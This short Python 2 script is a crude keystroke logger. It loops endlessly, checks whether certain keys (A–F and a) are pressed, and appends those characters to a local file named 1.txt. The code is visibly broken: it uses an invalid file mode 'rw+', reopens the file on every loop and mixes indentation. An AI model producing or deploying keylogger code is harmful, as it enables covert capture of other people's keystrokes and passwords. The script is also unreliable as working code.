import keyboard
from types import *
from stat import *
import os
import sys
list = [65,66,67,68,69,70,97]
fisier = '1.txt'
while True:
	for i in list:
		try:
			 fd = open(fisier,'rw+')
			 if keyboard.is_pressed(str(unichr(i))):
	      		 	fd.write(str(unichr(i)))
		except IOError:
			os.system("touch 1.txt")
